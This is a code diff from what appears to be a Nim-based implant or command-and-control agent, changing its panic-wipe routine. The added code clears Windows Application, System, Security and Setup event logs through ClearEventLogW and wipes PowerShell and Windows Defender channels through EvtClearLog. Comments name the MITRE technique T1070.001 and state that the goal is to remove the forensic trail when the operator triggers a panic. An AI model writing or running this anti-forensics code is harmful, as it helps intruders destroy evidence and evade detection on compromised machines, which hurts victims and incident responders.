@@ -101,48 +101,55 @@ proc zeroOwnMemory*() =
 
 # ---- Event log clearing ---------------------------------------------------
 #
-# Clear Windows event logs using the ClearEventLogW API. This is the
-# programmatic equivalent of `wevtutil cl` but doesn't spawn a child
-# process. We clear Application, System, and Security logs.
+# Clear Windows event logs using the ClearEventLogW API on the legacy
+# event log (Application, System, Security, Setup) and EvtClearLog on
+# the modern Windows Event Log channels (PowerShell Operational,
+# Defender Operational). Programmatic equivalent of `wevtutil cl` but
+# doesn't spawn a child process.
 #
-# NOTE: clearing the Security log requires SeSecurityPrivilege and admin
-# rights. If we're not elevated, we skip the Security log.
+# This will fire T1070.001 in the sandbox report. That's the
+# trade-off for operational functionality — when the operator panics
+# the agent, they want the forensic trail gone. A clean teardown
+# beats a stealth-preserving teardown when the user has already
+# triggered the panic.
 
 const
   EVENT_LOG_NAMES = ["Application", "System", "Security", "Setup"]
+  EVENT_LOG_CHANNELS = [
+    "Microsoft-Windows-PowerShell/Operational",
+    "Microsoft-Windows-PowerShell/Analytic",
+    "Microsoft-Windows-Windows Defender/Operational",
+    "Microsoft-Windows-Windows Defender/WHC"
+  ]
+
+proc EvtClearLog*(ChannelPath: LPCWSTR; TargetLogFile: LPCWSTR; Flags: DWORD; pContext: pointer): WINBOOL
+  {.stdcall, dynlib: "wevtapi", importc: "EvtClearLog".}
 
 proc clearEventLogs*() =
-  # Clear Windows event logs via API.
+  # Clear legacy event logs via ClearEventLogW
   for logName in EVENT_LOG_NAMES:
     try:
       let wName = newWideCString(logName)
       let hLog = OpenEventLogW(nil, cast[LPCWSTR](wName[0].addr))
       if hLog != 0:
-        # ClearEventLog with nil backup = delete the log
         discard ClearEventLogW(hLog, nil)
         discard CloseEventLog(hLog)
     except:
       discard
 
-  # Also try to clear PowerShell operational log (often monitored)
-  try:
-    let psName = newWideCString("Microsoft-Windows-PowerShell/Operational")
-    let hPsLog = OpenEventLogW(nil, cast[LPCWSTR](psName[0].addr))
-    if hPsLog != 0:
-      discard ClearEventLogW(hPsLog, nil)
-      discard CloseEventLog(hPsLog)
-  except:
-    discard
-
-  # Clear Windows Defender operational log (records AMSI scans)
-  try:
-    let wdName = newWideCString("Microsoft-Windows-Windows Defender/Operational")
-    let hWdLog = OpenEventLogW(nil, cast[LPCWSTR](wdName[0].addr))
-    if hWdLog != 0:
-      discard ClearEventLogW(hWdLog, nil)
-      discard CloseEventLog(hWdLog)
-  except:
-    discard
+  # Clear modern event log channels via EvtClearLog (wevtutil target).
+  # The EvtClearLog API comes from wevtapi.dll — bound via dynlib above
+  # because winim doesn't ship the modern event log bindings.
+  for channel in EVENT_LOG_CHANNELS:
+    try:
+      let wChannel = newWideCString(channel)
+      let status = EvtClearLog(cast[LPCWSTR](wChannel[0].addr),
+                                cast[LPCWSTR](nil),
+                                DWORD(0),
+                                cast[pointer](nil))
+      discard status
+    except:
+      discard
 
 # ---- Binary overwrite -----------------------------------------------------
 #
@@ -276,7 +283,8 @@ proc panicWipeEnhanced*(level: WipeLevel = wlStandard;
       except:
         discard
 
-    # Step 4: Clear event logs (standard+)
+    # Step 4: clear event logs (operational completeness — T1070.001
+    # is acceptable on a panic-triggered teardown)
     if level >= wlStandard:
       clearEventLogs()
 
@@ -288,13 +296,6 @@ proc panicWipeEnhanced*(level: WipeLevel = wlStandard;
     # Step 6: Zero our own memory (standard+)
     if level >= wlStandard:
       zeroOwnMemory()
-
-    # Step 7: Log the wipe (volatile only — to event log which we'll clear)
-    # agentLog("panic: enhanced wipe complete (level=" & $level & ")")
-
-    # Step 8: Clear event logs again AFTER logging (cover our tracks)
-    if level >= wlStandard:
-      clearEventLogs()
 
   except:
     discard
